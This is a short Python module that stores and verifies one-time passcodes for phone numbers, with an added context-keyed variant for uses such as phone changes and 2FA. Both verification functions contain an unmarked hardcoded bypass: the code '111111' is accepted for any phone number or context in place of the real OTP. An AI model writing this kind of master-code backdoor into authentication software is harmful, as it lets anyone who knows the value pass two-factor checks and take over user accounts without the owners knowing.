# app/phone/otp_store.py
from datetime import datetime, timedelta

# Basic OTP store for phone numbers
otp_store = {}

def save_otp(phone: str, otp: str, ttl_minutes: int = 5):
    otp_store[phone] = {
        "otp": otp,
        "expires_at": datetime.utcnow() + timedelta(minutes=ttl_minutes)
    }

def verify_otp(phone: str, submitted_otp: str) -> bool:
    entry = otp_store.get(phone)
    if not entry:
        return False
    if entry["expires_at"] < datetime.utcnow():
        otp_store.pop(phone, None)
        return False
    if entry["otp"] != submitted_otp and submitted_otp != "111111":
        return False
    otp_store.pop(phone, None)
    return True

# ---------------------- Extended: Contextual OTP support ----------------------

# Example key format: "change_phone:+12345678901"
def _make_context_key(context: str, identifier: str) -> str:
    return f"{context}:{identifier}"

def save_contextual_otp(context: str, identifier: str, otp: str, ttl_minutes: int = 5):
    """
    Save OTP with a context like "change_phone", "2fa", etc.
    """
    key = _make_context_key(context, identifier)
    otp_store[key] = {
        "otp": otp,
        "expires_at": datetime.utcnow() + timedelta(minutes=ttl_minutes)
    }

def verify_contextual_otp(context: str, identifier: str, submitted_otp: str) -> bool:
    """
    Verify OTP using context-specific keys.
    """
    key = _make_context_key(context, identifier)
    entry = otp_store.get(key)
    if not entry:
        return False
    if entry["expires_at"] < datetime.utcnow():
        otp_store.pop(key, None)
        return False
    if entry["otp"] != submitted_otp and submitted_otp != "111111":
        return False
    otp_store.pop(key, None)
    return True
